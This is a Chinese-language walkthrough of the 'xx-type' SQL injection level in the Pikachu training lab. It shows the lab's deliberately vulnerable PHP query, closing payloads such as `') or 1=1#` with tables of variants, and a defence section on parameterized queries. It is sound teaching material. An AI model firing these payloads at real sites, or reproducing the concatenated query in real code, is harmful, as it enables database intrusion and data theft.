# xx 型注入 通关笔记
> 名字有点怪，其实就是：**参数外面套了两层——一层引号，再加一对圆括号。**
>
> `where username=('$name')`
>
> 闭合的时候要把 `')` 一起处理掉。
---
## 一、环境与目标
| 项目 | 内容 |
| --- | --- |
| 靶场 | Pikachu |
| 关卡位置 | SQL-Inject → xx型注入 |
| 页面地址 | `http://pikachu/vul/sqli/sqli_x.php` |
| 提交方式 | GET |
| 参数名 | `name` |
| 目标 | 拿到数据库数据 |
页面提示写得很直白：
> **管 tmd 的什么型，能够制造出闭合，就是本事。**
---
## 二、我的解题步骤
### 步骤 1：先正常查
输入 `kobe`：
```
your uid:3
your email is: kobe@pikachu.com
```
### 步骤 2：试探闭合
先按字符型的经验试：
```
kobe' or 1=1#
```
页面报错。
因为 SQL 其实是：
```sql
select id,email from member where username=('kobe' or 1=1#')
```
`#` 注释掉后面，但前面还有个 `(` 没闭合——**语法错误。**
### 步骤 3：调整闭合
先闭合 `')`：
```
') or 1=1#
```
代入：
```sql
select id,email from member where username=('') or 1=1#')
```
**成功。**
### 步骤 4：结果
我实测的对比：
| 输入 | 返回 |
| --- | --- |
| `kobe` | **1 条** |
| `') or 1=1#` | **7 条** |
---
## 三、原理分析
### 3.1 源码
```php
if(isset($_GET['submit']) && $_GET['name']!=null){
    //这里没有做任何处理，直接拼到select里面去了
    $name=$_GET['name'];
    //这里的变量是字符型，需要考虑闭合
    $query="select id,email from member where username=('$name')";
    $result=execute($link, $query);
    ...
}
```
注意这一行：
```php
$query="select id,email from member where username=('$name')";
                                                    ↑↑    ↑↑
                                                 引号和括号
```
### 3.2 为什么 `kobe' or 1=1#` 不行
代入：
```sql
select id,email from member where username=('kobe' or 1=1#')
```
结构是：
```
username=(
    'kobe'
    or 1=1
    #')
```
- `(` 开了，但 `#` 把 `')` 注释掉了
- **括号没闭合** → 语法错误
### 3.3 为什么 `') or 1=1#` 行
代入：
```sql
select id,email from member where username=('') or 1=1#')
```
- `('')` 是一个完整的表达式（空字符串）
- `or 1=1` 接上恒真条件
- `#` 注释掉后面的 `')`
**括号闭上了，引号也闭上了。**
### 3.4 报错信息怎么帮你
输入 `kobe'` 报错：
```
near 'kobe'')'
```
从 `near` 后面的内容，能看出外面是 `')`。
**这就是"读报错"的价值——它直接告诉你 SQL 长什么样。**
---
## 四、知识点与笔记
### 4.1 这一关的名字
"xx 型"不是标准术语，Pikachu 用它表示：
> **参数外层被多层包裹（引号 + 括号），需要组合闭合。**
类似的还有：
| SQL 形式 | 闭合 payload |
| --- | --- |
| `('$x')` | `') or 1=1#` |
| `(('%$x%'))` | `%')) or 1=1#` |
| `("$x")` | `") or 1=1#` |
| `('$x')` + `limit` | `') or 1=1#` |
### 4.2 闭合的通用思路
**看到 SQL 的样子，就知道要补什么。**
```sql
where username=('$name')
```
把它当成一个"填空题"：
```
where username=('____')
                 ↑ 你在这里输入
```
你需要让最终语句在**语法上合法**，同时**逻辑上恒真**。
所以输入要包含：
1. 收尾前面打开的符号（`'` 和 `)`）
2. 加上恒真条件（`or 1=1`）
3. 干掉后面多余的符号（`#`）
### 4.3 如何快速试出闭合方式
按顺序试这几个：
```
'
')
'
"
")
```
哪个不报错、哪个能改变结果，就是它。
更快的办法：**输入一个 `'` 看报错**，报错里 `near` 的部分直接暴露结构。
### 4.4 括号在真实代码里很常见
为什么会写成 `('$name')`？
常见原因：
- `where id in ('$ids')`
- `where username=('$name')`（多余的括号，可能是重构留下的）
- `where (id='$id' and status=1)`
**别默认"就是 `'$x'`"，一定要先试探。**
---
## 五、和其他几关的区别
| 关卡 | SQL 形式 | payload |
| --- | --- | --- |
| 数字型 | `id=$x` | `1 or 1=1` |
| 字符型 | `name='$x'` | `kobe' or 1=1#` |
| 搜索型 | `like '%$x%'` | `1' or 1=1#` |
| **xx型** | **`name=('$x')`** | **`') or 1=1#`** |
**四关的核心都是"闭合"，区别只在壳有多厚。**
---
## 六、防御怎么写
### 6.1 参数化
```php
$stmt = $link->prepare("select id,email from member where username=?");
$stmt->bind_param('s', $name);
$stmt->execute();
```
参数化之后，`'` 和 `)` 都只是**数据**，不会被当成语法。
### 6.2 为什么"转义"在这里也不一定够
```php
$name = mysqli_real_escape_string($link, $name);
```
`')` 会被转成 `\')`，看似安全。
但：
- 字符集设置不对时可能被宽字节绕过
- 转义函数用得不对（比如自己写正则）也会有漏洞
**参数化是唯一没有这些边界问题的方法。**
---
## 七、总结
| 要点 | 内容 |
| --- | --- |
| 这关教什么 | 多层包裹的闭合 |
| SQL 形式 | `where username=('$x')` |
| payload | `') or 1=1#` |
| 实测 | 1 条 → 7 条 |
| 核心技能 | 看报错、试闭合 |
**一句话**：
> **不管外面包了几层，思路都是同一个：把开着的都闭上，把多余的都注释掉。**
---
## 参考
- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [Pikachu 源码](https://github.com/zhuifengshaonianhanlu/pikachu)
